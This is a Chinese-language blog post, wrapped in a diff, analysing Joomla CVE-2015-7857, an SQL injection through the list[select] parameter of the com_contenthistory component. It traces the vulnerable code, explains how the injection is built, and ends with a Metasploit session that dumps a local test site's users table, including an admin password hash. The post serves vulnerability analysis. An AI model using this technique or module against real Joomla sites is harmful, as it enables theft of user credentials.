@@ -1,0 +1,393 @@
+I"�;<h1 id="joomla-32-344-sqli-cve-2015-7857-漏洞分析">Joomla 3.2-3.4.4 Sqli CVE-2015-7857 漏洞分析</h1>
+<p class="date">26 Oct 2015 - Tr3jer_CongRong</p>
+<blockquote>
+  <p>Joomla是一套获得过多个奖项的内容管理系统（Content Management System，CMS），它采用PHP＋MySQL数据库开发，可以运行在Linux、Windows、MacOSX、Solaris等多种平台上。除了具有新闻/文章管理、文档/图片管理、网站布局设置、模板/主题管理等一些基本功能外，还可以通过其提供的上千个插件进行功能扩展。同时它还支持多种语言，由于它的功能非常强大，语言支持强，因此在全世界范围内都有很广泛的应用。</p>
+</blockquote>
+
+<h4 id="漏洞分析">漏洞分析</h4>
+<p>      Joomla近日爆出一个由于接收参数过滤不严导致sql注入的漏洞<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-7857">CVE-2015-7857</a>，通过这个注入漏洞甚至可以得到数据库中任何数据,首先看看漏洞触发组件<code>contenthistory</code>。</p>
+
+<blockquote>
+  <p><code>/components/com_contenthistory/contenthistory.php</code></p>
+</blockquote>
+
+<pre><code>&lt;?php
+defined('_JEXEC') or die;
+
+// Load the com_contenthistory language files, default to the admin file and 	fall back to site if one isn't found
+$lang = JFactory::getLanguage();
+$lang-&gt;load('com_contenthistory', JPATH_ADMINISTRATOR, null, false, true)
+||	$lang-&gt;load('com_contenthistory', JPATH_SITE, null, false, true);
+
+// Hand processing over to the admin base file
+require_once JPATH_COMPONENT_ADMINISTRATOR . '/contenthistory.php';
+</code></pre>
+
+<p>      加载了<code>/administrator/components/com_contenthistory/contenthistory.php</code>这个文件，Joomla管理组件都放在<code>/administrator/components/</code>目录下，而且所有管理组件都会先检查权限：</p>
+
+<pre><code>if (!JFactory::getUser()-&gt;authorise('core.manage', 'com_checkin'))
+{
+return JError::raiseWarning(404, JText::_('JERROR_ALERTNOAUTHOR'));
+}
+</code></pre>
+
+<p>      可是<code>com_contenthistory</code>组件在require之前并没有进行此权限检查，再看看加载的这个组件都做了什么。</p>
+
+<blockquote>
+  <p><code>/administrator/components/com_contenthistory/contenthistory.php</code></p>
+</blockquote>
+
+<pre><code>&lt;?php
+defined('_JEXEC') or die;
+
+$controller = JControllerLegacy::getInstance('Contenthistory', 	array('base_path' =&gt; JPATH_COMPONENT_ADMINISTRATOR));
+$controller-&gt;execute(JFactory::getApplication()-&gt;input-&gt;get('task'));
+$controller-&gt;redirect();
+</code></pre>
+
+<p>      首先调用<code>JControllerLegacy</code>类并赋值给变量<code>$controller</code>，随后<code>$controller</code>调用了控制器<code>execute()</code>方法。调用的过程传递了<code>JFactory</code>类的<code>getApplication()</code>方法，最后调用了<code>display()</code>控制类，用来实现显示的视图模块。</p>
+
+<blockquote>
+  <p><code>/libraries/legacy/controller/legacy.php</code></p>
+</blockquote>
+
+<pre><code>public function display($cachable = false, $urlparams = array())
+{
+	$document = JFactory::getDocument();
+	$viewType = $document-&gt;getType();
+	$viewName = $this-&gt;input-&gt;get('view', $this-&gt;default_view);
+	$viewLayout = $this-&gt;input-&gt;get('layout', 'default', 'string');
+
+	$view = $this-&gt;getView($viewName, $viewType, '', array('base_path' =&gt; $this-&gt;basePath, 'layout' =&gt; $viewLayout));
+
+	// Get/Create the model
+	if ($model = $this-&gt;getModel($viewName))
+	{
+		// Push the model into the view (as default)
+		$view-&gt;setModel($model, true);
+	}
+
+	$view-&gt;document = $document;
+
+	$conf = JFactory::getConfig();
+
+	// Display the view
+	if ($cachable &amp;&amp; $viewType != 'feed' &amp;&amp; $conf-&gt;get('caching') &gt;= 1)
+	{
+		$option = $this-&gt;input-&gt;get('option');
+		$cache = JFactory::getCache($option, 'view');
+
+		if (is_array($urlparams))
+		{
+			$app = JFactory::getApplication();
+
+			if (!empty($app-&gt;registeredurlparams))
+			{
+				$registeredurlparams = $app-&gt;registeredurlparams;
+			}
+			else
+			{
+				$registeredurlparams = new stdClass;
+			}
+
+			foreach ($urlparams as $key =&gt; $value)
+			{
+				// Add your safe url parameters with variable type as value {@see JFilterInput::clean()}.
+				$registeredurlparams-&gt;$key = $value;
+			}
+
+			$app-&gt;registeredurlparams = $registeredurlparams;
+		}
+
+		$cache-&gt;get($view, 'display');
+	}
+	else
+	{
+		$view-&gt;display();
+	}
+
+	return $this;
+}
+</code></pre>
+
+<p>      程序进行到这个方法时会接收<code>view</code>参数进行显示视图，在第一个if语句快中可以看出请求到模块名时则加载对应的模块，最后<code>$view</code>调用<code>display()</code>方法进行视图处理。跟进到<code>administrator</code>历史模块的数据库操作方法，程序进行到此调用<code>getListQuery()</code>方法时进行数据提取。</p>
+
+<blockquote>
+  <p><code>/administrator/components/com_contenthistory/models/history.php</code></p>
+</blockquote>
+
+<pre><code>protected function getListQuery()
+{
+	// Create a new query object.
+	$db = $this-&gt;getDbo();
+	$query = $db-&gt;getQuery(true);
+
+	// Select the required fields from the table.
+	$query-&gt;select(
+		$this-&gt;getState(
+			'list.select',
+			'h.version_id, h.ucm_item_id, h.ucm_type_id, h.version_note, h.save_date, h.editor_user_id,' .
+			'h.character_count, h.sha1_hash, h.version_data, h.keep_forever'
+		)
+	)
+	-&gt;from($db-&gt;quoteName('#__ucm_history') . ' AS h')
+	-&gt;where($db-&gt;quoteName('h.ucm_item_id') . ' = ' . $this-&gt;getState('item_id'))
+	-&gt;where($db-&gt;quoteName('h.ucm_type_id') . ' = ' . $this-&gt;getState('type_id'))
+
+	// Join over the users for the editor
+	-&gt;select('uc.name AS editor')
+	-&gt;join('LEFT', '#__users AS uc ON uc.id = h.editor_user_id');
+
+	// Add the list ordering clause.
+	$orderCol = $this-&gt;state-&gt;get('list.ordering');
+	$orderDirn = $this-&gt;state-&gt;get('list.direction');
+	$query-&gt;order($db-&gt;quoteName($orderCol) . $orderDirn);
+
+	return $query;
+}
+</code></pre>
+
+<p>      进行数据提取的时候调用了<code>getState()</code>函数，用于获取请求模型的属性值。</p>
+
+<blockquote>
+  <p><code>/libraries/legacy/model/legacy.php</code></p>
+</blockquote>
+
+<pre><code>public function getState($property = null, $default = null)
+{
+	if (!$this-&gt;__state_set)
+	{
+		// Protected method to auto-populate the model state.
+		$this-&gt;populateState();
+
+		// Set the model state set flag to true.
+		$this-&gt;__state_set = true;
+	}
+
+	return $property === null ? $this-&gt;state : $this-&gt;state-&gt;get($property, $default);
+}
+</code></pre>
+
+<p>      随后调用当前类的<code>populateState()</code>方法，用于过滤请求的参数为指定的数据类型。</p>
+
+<blockquote>
+  <p><code>/administrator/components/com_contenthistory/models/history.php</code></p>
+</blockquote>
+
+<pre><code>protected function populateState($ordering = null, $direction = null)
+{
+	$input = JFactory::getApplication()-&gt;input;
+	$itemId = $input-&gt;get('item_id', 0, 'integer');
+	$typeId = $input-&gt;get('type_id', 0, 'integer');
+	$typeAlias = $input-&gt;get('type_alias', '', 'string');
+
+	$this-&gt;setState('item_id', $itemId);
+	$this-&gt;setState('type_id', $typeId);
+	$this-&gt;setState('type_alias', $typeAlias);
+	$this-&gt;setState('sha1_hash', $this-&gt;getSha1Hash());
+
+	// Load the parameters.
+	$params = JComponentHelper::getParams('com_contenthistory');
+	$this-&gt;setState('params', $params);
+
+	// List state information.
+	parent::populateState('h.save_date', 'DESC');
+}
+</code></pre>
+
+<p>      程序执行到方法末尾时执行了<code>parent::populateState('h.save_date', 'DESC');</code>也就是调用父类的<code>populateState()</code>方法，用于过滤接收的<code>list[]</code>数组。</p>
+
+<blockquote>
+  <p><code>/libraries/legacy/model/list.php</code></p>
+</blockquote>
+
+<pre><code>protected function populateState($ordering = null, $direction = null)
+{
+	// If the context is set, assume that stateful lists are used.
+	if ($this-&gt;context)
+	{
+		$app = JFactory::getApplication();
+
+		// Receive &amp; set filters
+		if ($filters = $app-&gt;getUserStateFromRequest($this-&gt;context . '.filter', 'filter', array(), 'array'))
+		{
+			foreach ($filters as $name =&gt; $value)
+			{
+				$this-&gt;setState('filter.' . $name, $value);
+			}
+		}
+
+		$limit = 0;
+
+		// Receive &amp; set list options
+		if ($list = $app-&gt;getUserStateFromRequest($this-&gt;context . '.list', 'list', array(), 'array'))
+		{
+			foreach ($list as $name =&gt; $value)
+			{
+				// Extra validations
+				switch ($name)
+				{
+					case 'fullordering':
+						$orderingParts = explode(' ', $value);
+
+						if (count($orderingParts) &gt;= 2)
+						{
+							// Latest part will be considered the direction
+							$fullDirection = end($orderingParts);
+
+							if (in_array(strtoupper($fullDirection), array('ASC', 'DESC', '')))
+							{
+								$this-&gt;setState('list.direction', $fullDirection);
+							}
+
+							unset($orderingParts[count($orderingParts) - 1]);
+
+							// The rest will be the ordering
+							$fullOrdering = implode(' ', $orderingParts);
+
+							if (in_array($fullOrdering, $this-&gt;filter_fields))
+							{
+								$this-&gt;setState('list.ordering', $fullOrdering);
+							}
+						}
+						else
+						{
+							$this-&gt;setState('list.ordering', $ordering);
+							$this-&gt;setState('list.direction', $direction);
+						}
+						break;
+
+					case 'ordering':
+						if (!in_array($value, $this-&gt;filter_fields))
+						{
+							$value = $ordering;
+						}
+						break;
+
+					case 'direction':
+						if (!in_array(strtoupper($value), array('ASC', 'DESC', '')))
+						{
+							$value = $direction;
+						}
+						break;
+
+					case 'limit':
+						$limit = $value;
+						break;
+
+					// Just to keep the default case
+					default:
+						$value = $value;
+						break;
+				}
+
+				$this-&gt;setState('list.' . $name, $value);
+			}
+		}
+		else
+		// Keep B/C for components previous to jform forms for filters
+		{
+			// Pre-fill the limits
+			$limit = $app-&gt;getUserStateFromRequest('global.list.limit', 'limit', $app-&gt;get('list_limit'), 'uint');
+			$this-&gt;setState('list.limit', $limit);
+
+			// Check if the ordering field is in the white list, otherwise use the incoming value.
+			$value = $app-&gt;getUserStateFromRequest($this-&gt;context . '.ordercol', 'filter_order', $ordering);
+
+			if (!in_array($value, $this-&gt;filter_fields))
+			{
+				$value = $ordering;
+				$app-&gt;setUserState($this-&gt;context . '.ordercol', $value);
+			}
+
+			$this-&gt;setState('list.ordering', $value);
+
+			// Check if the ordering direction is valid, otherwise use the incoming value.
+			$value = $app-&gt;getUserStateFromRequest($this-&gt;context . '.orderdirn', 'filter_order_Dir', $direction);
+
+			if (!in_array(strtoupper($value), array('ASC', 'DESC', '')))
+			{
+				$value = $direction;
+				$app-&gt;setUserState($this-&gt;context . '.orderdirn', $value);
+			}
+
+			$this-&gt;setState('list.direction', $value);
+		}
+
+		// Support old ordering field
+		$oldOrdering = $app-&gt;input-&gt;get('filter_order');
+
+		if (!empty($oldOrdering) &amp;&amp; in_array($oldOrdering, $this-&gt;filter_fields))
+		{
+			$this-&gt;setState('list.ordering', $oldOrdering);
+		}
+
+		// Support old direction field
+		$oldDirection = $app-&gt;input-&gt;get('filter_order_Dir');
+
+		if (!empty($oldDirection) &amp;&amp; in_array(strtoupper($oldDirection), array('ASC', 'DESC', '')))
+		{
+			$this-&gt;setState('list.direction', $oldDirection);
+		}
+
+		$value = $app-&gt;getUserStateFromRequest($this-&gt;context . '.limitstart', 'limitstart', 0);
+		$limitstart = ($limit != 0 ? (floor($value / $limit) * $limit) : 0);
+		$this-&gt;setState('list.start', $limitstart);
+	}
+	else
+	{
+		$this-&gt;setState('list.start', 0);
+		$this-&gt;setState('list.limit', 0);
+	}
+}
+</code></pre>
+
+<p>      函数使用switch语句判断<code>fullordering</code>、<code>ordering</code>、<code>direction</code>、<code>limit</code>是否过滤，但是没有验证<code>list[select]</code>，这时当程序执行到<code>$this-&gt;getState(list.select)</code>，则导致注入。测试下，访问<code>contenthistory</code>组件时无限制加载，option=comtenthistory加载历史模块，view=history加载历史视图，list[select]=1满足条件时，则会报错。</p>
+
+<p><img src="https://blog-1252048719.cos.ap-shanghai.myqcloud.com/6u5htrdfgx.png" /></p>
+
+<p>      程序执行到<code>populateState()</code>方法接收参数时确保<code>item_id</code>、<code>type_id</code>、<code>list[ordering]</code>要同时传递，就可以构造payload进行报错注入获得数据，无需获取表前缀，%23_即为joomla表前缀，joomla会自动将#_转换为表前缀，因为joomla的前缀为随机字符串，也可以通过报错获得这个随机字符串。</p>
+
+<p><img src="https://blog-1252048719.cos.ap-shanghai.myqcloud.com/54gtersdf.png" /></p>
+
+<blockquote>
+  <p>Msf也已经更新了此漏洞的Exploit：</p>
+</blockquote>
+
+<pre><code>msf &gt; use auxiliary/gather/joomla_contenthistory_sqli
+msf auxiliary(joomla_contenthistory_sqli) &gt; show options
+
+Module options (auxiliary/gather/joomla_contenthistory_sqli):
+Name       Current Setting  Required  Description
+----       ---------------  --------  -----------
+Proxies                     no        A proxy chain of format 	type:host:port[,type:host:port][...]
+RHOST                       yes       The target address
+RPORT      80               yes       The target port
+TARGETURI  /                yes       The relative URI of the Joomla 	instance
+VHOST                       no        HTTP server virtual host
+
+msf auxiliary(joomla_contenthistory_sqli) &gt; set RHOST 127.0.0.1
+RHOST =&gt; 127.0.0.1
+msf auxiliary(joomla_contenthistory_sqli) &gt; set TARGETURI /joomla_3.4.4
+TARGETURI =&gt; /joomla_3.4.4
+msf auxiliary(joomla_contenthistory_sqli) &gt; show options
+	
+Module options (auxiliary/gather/joomla_contenthistory_sqli):
+Name       Current Setting  Required  Description
+----       ---------------  --------  -----------
+Proxies                     no        A proxy chain of format 	type:host:port[,type:host:port][...]
+RHOST      127.0.0.1        yes       The target address
+RPORT      80               yes       The target port
+TARGETURI  /joomla_3.4.4    yes       The relative URI of the Joomla 	instance
+VHOST                       no        HTTP server virtual host
+
+msf auxiliary(joomla_contenthistory_sqli) &gt; run
+
+[+] Saved file to: /Users/CongRong/.msf4/loot/20151026230744_default_127.0.0.1_joomla.users_471318.txt
+[+] Saved file to: /Users/CongRong/.msf4/loot/20151026230917_default_127.0.0.1_joomla.users_140130.txt
+[*] Auxiliary module execution completed
+msf auxiliary(joomla_contenthistory_sqli) &gt; cat .msf4/loot/20151026230744_default_127.0.0.1_joomla.users_471318.txt
+[*] exec: cat .msf4/loot/20151026230744_default_127.0.0.1_joomla.users_471318.txt
+[{"activation":"","block":"","email":"admin@qq.com","id":"1","lastResetTime":"","lastvisitDate":"","name":"","otep":"","otpKey":"","params":"","password":"d1a1976e385ae56e05524b9517111c75e47c1d23079229c867a7ecc5cd76e8a3","registerDate":"","requireReset":"","resetCount":"","sendEmail":"","username":"admin"}]
+</code></pre>
+:ET
